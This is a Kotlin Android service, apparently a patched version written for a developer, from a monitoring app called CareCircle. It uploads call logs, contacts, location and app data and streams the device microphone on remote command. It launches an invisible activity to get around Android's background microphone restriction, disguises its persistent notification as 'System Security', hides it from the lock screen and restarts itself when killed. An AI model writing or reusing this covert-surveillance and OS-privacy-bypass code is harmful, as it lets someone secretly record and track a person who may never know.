package com.example.background

import android.Manifest
import android.app.AlarmManager
import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.app.Service
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.content.pm.ServiceInfo
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.os.SystemClock
import android.util.Log
import androidx.core.app.NotificationCompat
import androidx.core.content.ContextCompat
import com.google.firebase.firestore.FieldValue
import com.google.firebase.firestore.FirebaseFirestore
import com.google.firebase.firestore.SetOptions
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.cancel
import kotlinx.coroutines.launch

/**
 * 🛡️ CareCircleForegroundService (Master Service — PATCHED v2)
 *
 * Tumhare current code ka SAARA logic preserved hai (NativeDataCollector,
 * CallDetectorService, FirestoreClient listener, contacts sync, device admin,
 * WorkManager revival). Sirf ye fixes add hue:
 *
 * ⭐ FIX #1 (ROOT CAUSE — 30-60 min silent mic):
 *   onCreate ke startForeground me mic type fail hone pe ab LOUD Log.e +
 *   report (pehle chup-chaap SPECIAL_USE-only pe fall back ho jata tha —
 *   background restart ke baad mic permanently blocked, kisi ko pata nahi).
 *
 * ⭐ FIX #2 (MIC GATE): handleMicSync ab MicEligibility check karta hai.
 *   App background me hai → MicGateActivity (300ms invisible) launch hoti
 *   hai → "app in use" state restore → mic LEGAL. Foreground me hai →
 *   direct start.
 *
 * ⭐ FIX #3 (SILENCE WATCHDOG): har loop me check — WebRTC connected but
 *   mic 10s se PURE ZEROS de raha hai = OS-blocked mic → auto-heal
 *   (session rebuild with NEW call_id, max 3 attempts) → parent ko
 *   mic_state report (jhoth "connected" nahi).
 *
 * ⭐ FIX #4 (BATTERY):
 *   - Indefinite master WakeLock HATA DIYA (5-15%/day drain + Realme
 *     "abnormal behavior" flag — tumhare AccessibilityWatchdogService v4
 *     ne bhi yahi lesson seekha tha). Streaming ke dauran NativeWebRTCAudioSender
 *     ka apna 2hr-cap wakelock kaafi hai. Firestore listener push-based hai.
 *   - Main loop 10s → 60s (6x kam CPU wakeups; listener realtime hi hai)
 *
 * ⭐ FIX #6 (mic_state REPORTING): child_control doc me real status:
 *   streaming / connecting / healing_n / blocked_silent / blocked_fgs_type /
 *   blocked_no_permission / stopped — parent app UI me dikhao.
 *
 * NOT RESPONSIBLE FOR (unchanged):
 *  - Service revival (WorkManager + RestartReceiver)
 *  - App blocking (AccessibilityWatchdogService)
 *  - Notification capture (CareCircleNotificationListener)
 */
class CareCircleForegroundService : Service() {

    companion object {
        private const val TAG = "CC_FOREGROUND"
        private const val CHANNEL_ID = "carecircle_foreground_channel"
        private const val NOTIFICATION_ID = 1001

        // ⭐ FIX #4: 10s → 60s (battery). Snapshot listener realtime hai,
        // loop sirf defensive checks + timed syncs ke liye hai.
        private const val LOOP_INTERVAL_MS = 60_000L
        private const val HEARTBEAT_INTERVAL_MS = 3 * 60_000L
        private const val FULL_SYNC_INTERVAL_MS = 30 * 60_000L
        private const val APPS_SYNC_INTERVAL_MS = 24 * 60 * 60_000L
        private const val CALL_LOGS_SYNC_INTERVAL_MS = 30 * 60_000L

        private const val WAKE_LOCK_TAG = "CareCircle::MasterWakeLock"
        private const val PREFS_NAME = "carecircle_prefs"

        // ⭐ FIX #3: silence watchdog limits
        private const val MAX_MIC_HEAL_ATTEMPTS = 3

        /** MicGateActivity ke liye service ka live reference */
        @Volatile
        var instanceRef: CareCircleForegroundService? = null

        /**
         * Start the master foreground service.
         */
        fun start(context: Context) {
            val intent = Intent(context, CareCircleForegroundService::class.java)
            try {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    context.startForegroundService(intent)
                } else {
                    context.startService(intent)
                }
                Log.d(TAG, "CareCircleForegroundService start requested")
            } catch (e: Exception) {
                Log.e(TAG, "Failed to start service: ${e.message}")
            }
        }

        /**
         * Check if master service is running (used by WorkManager + RestartReceiver)
         */
        fun isRunning(context: Context): Boolean {
            return try {
                val am = context.getSystemService(Context.ACTIVITY_SERVICE) as android.app.ActivityManager
                @Suppress("DEPRECATION")
                val services = am.getRunningServices(Int.MAX_VALUE)
                services.any {
                    it.service.className == "com.example.background.CareCircleForegroundService"
                }
            } catch (e: Exception) {
                false
            }
        }
    }

    private val handler = Handler(Looper.getMainLooper())
    private val serviceScope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
    private var lastHeartbeat = 0L
    private var lastFullSync = 0L
    private var lastAppsSync = 0L
    private var lastCallLogsSync = 0L
    private var lastSyncRequestCheck = 0L

    private lateinit var dataCollector: NativeDataCollector

    // 🔥 Native WebRTC for audio streaming (single instance reused)
    private var nativeWebRTC: NativeWebRTCAudioSender? = null
    private var webrtcRunning = false
    private var webrtcCallId: String? = null

    // ⭐ FIX #3: mic heal state
    private var micHealAttempts = 0

    override fun onCreate() {
        super.onCreate()
        instanceRef = this
        Log.d(TAG, "✅ CareCircleForegroundService created")

        // 🔥 CRITICAL: startForeground() within 5 sec of startForegroundService()
        // ⭐ FIX #1: mic type fail ho to LOUD fail — silent fallback pe
        // mic permanently blocked rehta tha aur kisi ko pata nahi chalta tha
        try {
            createNotificationChannel()
            val notification = buildNotification()

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
                try {
                    startForeground(
                        NOTIFICATION_ID,
                        notification,
                        ServiceInfo.FOREGROUND_SERVICE_TYPE_SPECIAL_USE or
                                ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE
                    )
                    Log.d(TAG, "✅ startForeground called (specialUse|microphone)")
                } catch (e: Exception) {
                    // ⭐ FIX #1: Log.e + report — ye service ab MIC-ke-bina chal
                    // rahi hai. Mic request aane pe MicGate isko heal karega.
                    Log.e(TAG, "🚨 startForeground(MIC|SPECIAL_USE) FAILED on create: ${e.message} " +
                            "— service SPECIAL_USE-only chal rahi hai, mic BLOCKED (MicGate se heal hoga)")
                    startForeground(
                        NOTIFICATION_ID,
                        notification,
                        ServiceInfo.FOREGROUND_SERVICE_TYPE_SPECIAL_USE
                    )
                }
            } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                try {
                    startForeground(
                        NOTIFICATION_ID,
                        notification,
                        ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE
                    )
                    Log.d(TAG, "✅ startForeground called (microphone)")
                } catch (e: Exception) {
                    Log.e(TAG, "🚨 startForeground(MIC) failed: ${e.message} — mic BLOCKED (MicGate se heal hoga)")
                    startForeground(NOTIFICATION_ID, notification)
                }
            } else {
                startForeground(NOTIFICATION_ID, notification)
            }
        } catch (e: Exception) {
            Log.e(TAG, "❌ startForeground FAILED: ${e.message}")
        }

        // Device Admin status log
        try {
            val isAdminEnabled = CareCircleDeviceAdminReceiver.isEnabled(this)
            Log.d(TAG, "🔒 Device Admin: ${if (isAdminEnabled) "ENABLED" else "DISABLED"}")
        } catch (e: Exception) {
            Log.e(TAG, "Device Admin check failed: ${e.message}")
        }

        // Initialize Firebase + data collector
        try {
            FirestoreClient.init(this)
            dataCollector = NativeDataCollector(this)
            Log.d(TAG, "✅ Data collector initialized")
        } catch (e: Exception) {
            Log.e(TAG, "❌ Data collector init failed: ${e.message}")
        }

        // ⭐ FIX #4: Indefinite WakeLock HATA DIYA.
        //   - 24/7 partial wakelock = 5-15%/day extra battery drain
        //   - OEM "abnormal behavior" detection trigger karta hai
        //     (tumhare AccessibilityWatchdogService v4 ne bhi yahi seekha tha)
        //   - Firestore listener push-based hai — wakelock ki zaroorat nahi
        //   - Streaming ke dauran NativeWebRTCAudioSender ka apna
        //     2hr-cap call wakelock CPU awake rakhta hai

        // 🔥 Start call detection automatically (AirDroid style)
        try {
            CallDetectorService.start(this)
            Log.d(TAG, "✅ CallDetectorService started")
        } catch (e: Exception) {
            Log.e(TAG, "Failed to start CallDetectorService: ${e.message}")
        }

        // 🔥 WebRTC Audio Sender (single instance reused across sessions)
        try {
            nativeWebRTC = NativeWebRTCAudioSender(applicationContext)
            Log.d(TAG, "✅ NativeWebRTCAudioSender initialized")
        } catch (e: Exception) {
            Log.e(TAG, "NativeWebRTCAudioSender init failed: ${e.message}")
        }

        // 🔥 Clean up any stale WebRTC state from previous session
        clearStaleWebRTCState()

        // 🌐 Network & Offline Sync Monitoring
        try {
            NetworkStateMonitor.start(applicationContext)
            OfflineSyncManager.triggerSync(applicationContext, "fgs_create")
        } catch (e: Exception) {
            Log.e(TAG, "Failed to start NetworkStateMonitor: ${e.message}")
        }

        // Start main loop
        handler.post(mainLoop)
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        Log.d(TAG, "onStartCommand source=${intent?.getStringExtra("source") ?: "restart/sticky"}")
        return START_STICKY
    }

    override fun onTaskRemoved(rootIntent: Intent?) {
        Log.d(TAG, "⚠️ Task removed — scheduling restart")
        try {
            val restartIntent = Intent(applicationContext, CareCircleForegroundService::class.java)
            val pendingIntent = PendingIntent.getService(
                this,
                1,
                restartIntent,
                PendingIntent.FLAG_ONE_SHOT or PendingIntent.FLAG_IMMUTABLE
            )
            val alarmManager = getSystemService(Context.ALARM_SERVICE) as AlarmManager
            try {
                // ⭐ Exact alarm jab allowed (SCHEDULE_EXACT_ALARM granted hai)
                val canExact = Build.VERSION.SDK_INT < Build.VERSION_CODES.S ||
                        alarmManager.canScheduleExactAlarms()
                if (canExact) {
                    alarmManager.setExactAndAllowWhileIdle(
                        AlarmManager.ELAPSED_REALTIME_WAKEUP,
                        SystemClock.elapsedRealtime() + 2000,
                        pendingIntent
                    )
                } else {
                    alarmManager.setAndAllowWhileIdle(
                        AlarmManager.ELAPSED_REALTIME_WAKEUP,
                        SystemClock.elapsedRealtime() + 2000,
                        pendingIntent
                    )
                }
            } catch (se: SecurityException) {
                Log.w(TAG, "exact alarm failed: ${se.message}")
                alarmManager.set(
                    AlarmManager.ELAPSED_REALTIME_WAKEUP,
                    SystemClock.elapsedRealtime() + 2000,
                    pendingIntent
                )
            }
        } catch (e: Exception) {
            Log.e(TAG, "Restart schedule failed: ${e.message}")
        }
        super.onTaskRemoved(rootIntent)
    }

    private var controlListenerRegistration: com.google.firebase.firestore.ListenerRegistration? = null

    override fun onDestroy() {
        Log.w(TAG, "❌ Service destroyed")
        handler.removeCallbacks(mainLoop)
        serviceScope.cancel()

        try {
            controlListenerRegistration?.remove()
            controlListenerRegistration = null
            Log.d(TAG, "Stopped child_control snapshot listener")
        } catch (e: Exception) {
            Log.e(TAG, "Failed to remove snapshot listener: ${e.message}")
        }

        // 🔥 Stop call detection
        try {
            CallDetectorService.stop(this)
        } catch (e: Exception) {
            Log.e(TAG, "Failed to stop CallDetectorService: ${e.message}")
        }

        // 🔥 Stop WebRTC on service destroy
        try {
            nativeWebRTC?.stop()
            nativeWebRTC = null
            webrtcRunning = false
        } catch (e: Exception) {
            Log.e(TAG, "WebRTC cleanup failed: ${e.message}")
        }

        instanceRef = null
        super.onDestroy()
    }

    override fun onBind(intent: Intent?): IBinder? = null

    // ============ Main Loop ============
    private val mainLoop = object : Runnable {
        override fun run() {
            try {
                val now = System.currentTimeMillis()

                // 🔥 Ensure Realtime Snapshot Listener is attached (0 polling reads!)
                ensureChildControlListener()

                // 📊 DATA COLLECTION — all on IO dispatcher (no ANR)
                if (::dataCollector.isInitialized) {

                    // 1. Heartbeat (3 min)
                    if (now - lastHeartbeat >= HEARTBEAT_INTERVAL_MS) {
                        serviceScope.launch {
                            try {
                                dataCollector.sendHeartbeat()
                            } catch (e: Exception) {
                                Log.e(TAG, "Heartbeat: ${e.message}")
                            }
                        }
                        lastHeartbeat = now
                    }

                    // 2. Full data sync (30 min — Screen Time, Device Info, Location ONLY)
                    if (now - lastFullSync >= FULL_SYNC_INTERVAL_MS) {
                        serviceScope.launch {
                            try {
                                dataCollector.collectAndSyncAll()
                            } catch (e: Exception) {
                                Log.e(TAG, "FullSync: ${e.message}")
                            }
                        }
                        lastFullSync = now
                    }

                    // 3. Installed apps sync (24 hours)
                    if (now - lastAppsSync >= APPS_SYNC_INTERVAL_MS) {
                        serviceScope.launch {
                            try {
                                dataCollector.syncInstalledApps()
                            } catch (e: Exception) {
                                Log.e(TAG, "AppsSync: ${e.message}")
                            }
                        }
                        lastAppsSync = now
                    }

                    // 4. Call logs sync (30 min — past 7 days + auto-clean old logs)
                    if (now - lastCallLogsSync >= CALL_LOGS_SYNC_INTERVAL_MS) {
                        serviceScope.launch {
                            try {
                                CallLogsSyncHelper(applicationContext).syncCallLogs(days = 7)
                            } catch (e: Exception) {
                                Log.e(TAG, "Periodic CallLogsSync: ${e.message}")
                            }
                        }
                        lastCallLogsSync = now
                    }

                    // 5. Offline sync check (if device is online and has pending offline records)
                    if (NetworkUtils.isNetworkAvailable(applicationContext)) {
                        val pendingCount = OfflineSyncDatabase.getInstance(applicationContext).getPendingCount()
                        if (pendingCount > 0) {
                            Log.d(TAG, "📦 Found $pendingCount pending offline records — triggering sync")
                            OfflineSyncManager.triggerSync(applicationContext, "loop_pending_check")
                        }
                    }
                }

                // ⭐ FIX #3: silence watchdog — blocked mic detect + auto-heal
                checkMicSilence()

            } catch (e: Exception) {
                Log.e(TAG, "Main loop error: ${e.message}")
            }

            handler.postDelayed(this, LOOP_INTERVAL_MS)
        }
    }

    /**
     * 🔥 Realtime Snapshot Listener Attachment — 0 Polling Reads!
     */
    private fun ensureChildControlListener() {
        if (controlListenerRegistration != null) return

        val uid = FirestoreClient.getUserId() ?: run {
            val prefsUid = getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
                .getString("currentUserId", null)
            if (!prefsUid.isNullOrEmpty()) {
                FirestoreClient.setUserId(prefsUid)
                prefsUid
            } else null
        } ?: return

        controlListenerRegistration = FirestoreClient.listenToChildControl { data ->
            handleChildControlChange(data)
        }

        if (controlListenerRegistration != null) {
            Log.d(TAG, "✅ Realtime snapshot listener attached to child_control/$uid (0 polling reads!)")
        }
    }

    /**
     * 🔥 Realtime handler for child_control document updates from Firestore.
     * Separates general sync (Screen time, Device Info, Location) from Contacts and Call Logs sync.
     */
    private fun handleChildControlChange(data: Map<String, Any?>) {
        val syncRequested = data["sync_request"] as? Boolean ?: false
        val contactsSyncRequested = data["contacts_sync_request"] as? Boolean ?: false
        val callLogsSyncRequested = data["call_logs_sync_request"] as? Boolean ?: false
        val syncMic = data["sync_mic"] as? Boolean ?: false
        val callId = data["call_id"] as? String

        // 1. General Sync: Screen Time, Device Info, Location & Call Logs
        if (syncRequested) {
            Log.d(TAG, "📡 Parent sync requested — collecting Screen Time, Device Info, Location & Call Logs")
            serviceScope.launch {
                try {
                    dataCollector.collectAndSyncAll()
                    CallLogsSyncHelper(applicationContext).syncCallLogs(days = 7)
                } catch (e: Exception) {
                    Log.e(TAG, "General sync failed: ${e.message}")
                } finally {
                    FirestoreClient.updateSyncComplete()
                }
            }
        }

        // 2. Call Logs Sync specifically requested
        if (callLogsSyncRequested) {
            Log.d(TAG, "📡 Call logs sync requested by parent — syncing Call Logs")
            serviceScope.launch {
                try {
                    CallLogsSyncHelper(applicationContext).syncCallLogs(days = 7)
                } catch (e: Exception) {
                    Log.e(TAG, "Call logs sync failed: ${e.message}")
                } finally {
                    try {
                        val current = currentUid()
                        if (current != null) {
                            FirebaseFirestore.getInstance().collection("child_control").document(current)
                                .update("call_logs_sync_request", FieldValue.delete())
                        }
                    } catch (_: Exception) {}
                }
            }
        }

        // 2. Contacts Sync ONLY (when parent explicitly requests contacts sync)
        if (contactsSyncRequested) {
            Log.d(TAG, "📡 Contacts sync requested by parent — syncing Contacts ONLY")
            serviceScope.launch {
                try {
                    ContactsSyncHelper(applicationContext).syncContacts()
                } catch (e: Exception) {
                    Log.e(TAG, "Contacts sync failed: ${e.message}")
                } finally {
                    FirestoreClient.clearContactsSyncRequest()
                }
            }
        }

        // 3. Audio listening control (WebRTC)
        handleMicSync(syncMic, callId)
    }

    /**
     * 🔥 Handle audio listening (sync_mic) — ⭐ FIX #2: MIC GATE ADDED
     *
     * Pehle: seedha nativeWebRTC.start() — background restart ke baad
     * Android 11+ while-in-use rule mic SILENTLY block kar deta tha
     * (AudioRecord chalta tha but zeros deta tha).
     */
    private fun handleMicSync(syncMic: Boolean, callId: String?) {
        if (syncMic && !callId.isNullOrEmpty()) {
            if (webrtcCallId != callId || !webrtcRunning) {
                Log.d(TAG, "🎤 Audio requested for call $callId (previous: $webrtcCallId)")

                // ⭐ CHECK 0: RECORD_AUDIO permission (user revoke to nahi kiya)
                if (ContextCompat.checkSelfPermission(this, Manifest.permission.RECORD_AUDIO)
                    != PackageManager.PERMISSION_GRANTED
                ) {
                    Log.e(TAG, "🚨 RECORD_AUDIO permission denied — blocked_no_permission report")
                    reportMicState("blocked_no_permission")
                    return
                }

                // ⭐ CHECK 1: Mic eligibility (while-in-use rule)
                if (MicEligibility.isAppInUse()) {
                    // App foreground/in-use — direct start 100% legal
                    startAudioSessionNow(callId)
                } else {
                    // App background — MicGate launch karo (while-in-use restore)
                    launchMicGate(callId)
                }
            }
        } else if (!syncMic && webrtcRunning) {
            stopAudioSession()
        }
    }

    /**
     * ⭐ FIX #2: MicGate launch — 300ms invisible activity se
     * "app in use" state restore karke mic legal banate hai.
     */
    private fun launchMicGate(callId: String) {
        Log.i(TAG, "🎤 Background mic request — MicGate launch (callId=$callId)")
        MicGateActivity.serviceRef = this
        MicGateActivity.pendingCallId = callId

        try {
            val intent = Intent(this, MicGateActivity::class.java).apply {
                addFlags(
                    Intent.FLAG_ACTIVITY_NEW_TASK or
                            Intent.FLAG_ACTIVITY_NO_USER_ACTION or
                            Intent.FLAG_ACTIVITY_NO_ANIMATION
                )
            }
            startActivity(intent)
            // Gate ke onResume se startAudioSessionNow(callId) aayega
        } catch (e: Exception) {
            // Background activity launch blocked (overlay permission nahi hai
            // ya OEM ne block kiya). Fallback: direct start try karte hai.
            Log.e(TAG, "MicGate launch blocked: ${e.message} — direct start try karte hai")
            startAudioSessionNow(callId)
        }
    }

    /**
     * ⭐ PUBLIC — MicGateActivity aur handleMicSync dono yahi call karte hai.
     * Tumhara original start logic + FGS mic-type re-assert.
     */
    fun startAudioSessionNow(callId: String) {
        Log.i(TAG, "🎤 startAudioSessionNow callId=$callId appInUse=${MicEligibility.isAppInUse()}")

        // ⭐ Re-assert FGS WITH microphone type — background restart ke baad
        // yahi silently missing hota tha (FIX #1). App "in use" hai ab
        // (direct ya MicGate se), isliye ye grant ho jana chahiye.
        assertForegroundWithMicType()

        if (webrtcRunning) {
            Log.d(TAG, "🔄 Call ID changed — stopping old WebRTC session")
            try {
                nativeWebRTC?.stop()
            } catch (e: Exception) {
                Log.e(TAG, "Old WebRTC stop failed: ${e.message}")
            }
            webrtcRunning = false
        }

        // 🔥 Update notification (text-only via notify() — FGS type safe)
        updateNotification(
            "CareCircle Listening Active",
            "Parent is listening to surroundings"
        )

        try {
            if (nativeWebRTC == null) {
                nativeWebRTC = NativeWebRTCAudioSender(applicationContext)
            }
            nativeWebRTC?.start(callId)
            webrtcRunning = true
            webrtcCallId = callId
            micHealAttempts = 0 // fresh session — heal counter reset

            getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
                .edit()
                .putBoolean("webrtc_running", true)
                .putString("webrtc_call_id", callId)
                .apply()
        } catch (e: Exception) {
            Log.e(TAG, "❌ WebRTC start failed: ${e.message}")
            webrtcRunning = false
            webrtcCallId = null
            reportMicState("start_failed")
        }
    }

    /**
     * ⭐ Extracted stop logic (handleMicSync stop branch + watchdog dono use karte hai)
     */
    private fun stopAudioSession() {
        Log.d(TAG, "🛑 Stopping audio listening")
        try {
            nativeWebRTC?.stop()
            webrtcRunning = false
            webrtcCallId = null
            micHealAttempts = 0

            getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
                .edit()
                .putBoolean("webrtc_running", false)
                .remove("webrtc_call_id")
                .apply()

            updateNotification(
                "CareCircle Protection Active",
                "Monitoring is running"
            )
            reportMicState("stopped")
        } catch (e: Exception) {
            Log.e(TAG, "❌ WebRTC stop failed: ${e.message}")
        }
    }

    /**
     * ⭐ FIX #1: FGS re-assert WITH microphone type. Fail ho to LOUD log
     * (koi silent fallback nahi). Return: mic type granted ya nahi.
     */
    private fun assertForegroundWithMicType(): Boolean {
        return try {
            val notification = buildNotification()
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                startForeground(
                    NOTIFICATION_ID,
                    notification,
                    ServiceInfo.FOREGROUND_SERVICE_TYPE_SPECIAL_USE or
                            ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE
                )
            } else {
                startForeground(NOTIFICATION_ID, notification)
            }
            true
        } catch (e: Exception) {
            Log.e(TAG, "🚨 assertForegroundWithMicType FAILED: ${e.message} — mic grant nahi hua")
            false
        }
    }

    /**
     * 🔥 Clear any stale WebRTC state on service restart.
     * Never auto-restore old sessions — parent will initiate a fresh session if needed.
     */
    private fun clearStaleWebRTCState() {
        try {
            getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
                .edit()
                .putBoolean("webrtc_running", false)
                .remove("webrtc_call_id")
                .apply()
            webrtcRunning = false
            webrtcCallId = null
            Log.d(TAG, "🧹 Cleared stale WebRTC state")
        } catch (e: Exception) {
            Log.e(TAG, "WebRTC state clear failed: ${e.message}")
        }
    }

    // ============ ⭐ FIX #3: SILENCE WATCHDOG ============

    /**
     * Har loop (60s) me check: WebRTC connected hai but mic 10s+ se
     * PURE ZEROS de raha hai? = OS ne mic block kiya (while-in-use
     * violation ya concurrent capture theft). Auto-heal:
     *   1. Session rebuild with NEW call_id ("xxx-h1", "xxx-h2"...)
     *   2. child_control doc me call_id update — parent naya offer bhejega
     *   3. Max 3 attempts → phir blocked_silent report (jhoth nahi)
     */
    private fun checkMicSilence() {
        val sender = nativeWebRTC ?: return
        if (!webrtcRunning || webrtcCallId == null) return
        if (!sender.isWatchdogSuspect()) return

        Log.e(TAG, "🚨 WATCHDOG: WebRTC alive but mic SILENT (zeros) — heal attempt ${micHealAttempts + 1}/$MAX_MIC_HEAL_ATTEMPTS")

        if (micHealAttempts < MAX_MIC_HEAL_ATTEMPTS) {
            micHealAttempts++
            reportMicState("healing_$micHealAttempts")

            try { sender.stop() } catch (_: Exception) {}
            webrtcRunning = false

            // NAYA call_id — fresh calls/ doc (purane doc me answer already
            // posted hai, wahi reuse karne se parent ka SDP stale ho jata).
            // Parent call_id change dekh ke apna session refresh karega.
            val newCallId = "${webrtcCallId}-h$micHealAttempts"
            currentUid()?.let { uid ->
                try {
                    FirebaseFirestore.getInstance()
                        .collection("child_control").document(uid)
                        .update("call_id", newCallId)
                } catch (e: Exception) {
                    Log.e(TAG, "call_id update failed: ${e.message}")
                }
            }

            val targetCallId = newCallId
            handler.postDelayed({
                if (instanceRef != null) startAudioSessionNow(targetCallId)
            }, 1500)
        } else {
            // Heal limit khatam — jhoth "Listening" mat dikhao
            Log.e(TAG, "🚨 Heal limit reached — mic_state=blocked_silent report")
            reportMicState("blocked_silent")
            stopAudioSession()
            updateNotification(
                "CareCircle Mic Blocked",
                "Child device se app ek baar kholna padega"
            )
        }
    }

    // ============ ⭐ FIX #6: MIC STATE REPORTING ============

    /** child_control doc me real mic status merge karo (parent UI ke liye) */
    private fun reportMicState(state: String) {
        val uid = currentUid() ?: return
        try {
            FirebaseFirestore.getInstance()
                .collection("child_control").document(uid)
                .set(
                    mapOf(
                        "mic_state" to state,
                        "mic_state_time" to FieldValue.serverTimestamp(),
                        "active_call_id" to webrtcCallId
                    ),
                    SetOptions.merge()
                )
            Log.d(TAG, "📊 mic_state = $state")
        } catch (e: Exception) {
            Log.e(TAG, "mic_state report failed: ${e.message}")
        }
    }

    private fun currentUid(): String? {
        return try {
            FirestoreClient.getUserId()
                ?: getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
                    .getString("currentUserId", null)
        } catch (e: Exception) {
            null
        }
    }

    /**
     * 🔥 Update notification text dynamically
     */
    private fun updateNotification(title: String, content: String) {
        try {
            val notification = NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle(title)
                .setContentText(content)
                .setSmallIcon(R.drawable.ic_notification)
                .setOngoing(true)
                .setPriority(NotificationCompat.PRIORITY_MIN)
                .setCategory(NotificationCompat.CATEGORY_SERVICE)
                .setShowWhen(false)
                .build()

            // 🔥 Use NotificationManager.notify() to update the notification text/UI.
            // NEVER call startForeground() here without MICROPHONE type —
            // (startForeground re-assert sirf assertForegroundWithMicType() me
            // hota hai jo HAMESHA mic type ke saath call karta hai)
            val manager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
            manager.notify(NOTIFICATION_ID, notification)

            Log.d(TAG, "✅ Notification text updated: $title")
        } catch (e: Exception) {
            Log.e(TAG, "Notification update failed: ${e.message}")
        }
    }

    // ============ Notification ============

    private fun buildNotification(): Notification {
        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("System Security")
            .setContentText("Device protection active")
            .setSmallIcon(R.drawable.ic_notification)
            .setOngoing(true)  // 🔥 Non-dismissable
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setCategory(NotificationCompat.CATEGORY_SERVICE)
            .setShowWhen(false)
            .build()
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                "System Protection",
                NotificationManager.IMPORTANCE_MIN
            ).apply {
                description = "Keeps system protection service active"
                setShowBadge(false)
                lockscreenVisibility = Notification.VISIBILITY_SECRET
            }
            val manager = getSystemService(NotificationManager::class.java)
            manager.createNotificationChannel(channel)
        }
    }
}
